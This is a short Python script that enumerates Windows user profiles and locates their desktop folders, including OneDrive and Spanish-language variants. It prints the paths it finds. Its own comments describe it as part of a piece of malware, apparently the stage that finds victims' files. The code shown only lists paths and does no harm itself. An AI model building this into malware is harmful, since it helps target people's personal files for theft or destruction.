import os

# This will find the users.
def findUsers(directory):
    users = []                                                                      # Create empty user list. 
    for f in os.scandir(directory):                                                 # Scan the users that exist inside of C:\Users.
        if f.name[0].isalpha() and f.is_dir() and not f.name == 'Default User' and not f.name == 'All Users' and not f.name == 'Default':     
            # If it starts with a letter, it exists and it is not a Default User.
            users.append(f.path)                                                    # Then get the path for the user.
    return users                                                                    # And add it to users.

# This will find the target foldrs inside of each user.
def findFolders(users, target_dirs):
    folders = []                                                    # Create a empty list for folders.
    for user in users:                                              # For the users in the user list.
        for target in target_dirs:                                  # And for the targets in the target directories.
            nodrive_name = os.path.join(user, target)               # Join the name of the user with the target directory.
            onedrive_name = os.path.join(user, f'OneDrive{target}') # And the same but puting OneDrive before.
            folders.append(nodrive_name)                            # Add it to folders.
            folders.append(onedrive_name)                           # Add it to folders.
    clean_folder = []                                               # Create a empty list for a clean folder.
    for fld in folders:                                             # For the folders in the previous list.
        if os.path.isdir(fld):                                      # If it exists.
            clean_folder.append(fld)                                # Get the path for them.
    return clean_folder                                             # Put it in the clean folder list.

# This will find the desktops of every user.
def findDesktops(users, desk_sys):
    desktops = []                                                   
    for user in users:                                              
        for target in desk_sys:                                     
            join = os.path.join(user, target)
            if os.path.isdir(join):                     
                desktops.append(join)                                   
    return desktops


# This tells the malware were the users are in windows.
directory = r'C:\users'
users = findUsers(directory)

# List of all posible locations for the desktop.
desk_sys = [
    r'Desktop\\',
    r'OneDrive\Desktop\\',
    r'Escritorio\\',
    r'OneDrive\Escritorio\\'
]

# Gets the full addresses for desktop posibilities.
desktops = findDesktops(users, desk_sys)

# Loop that goes through the options for the possible locations of desktop.
for options in desktops:
    print(options)
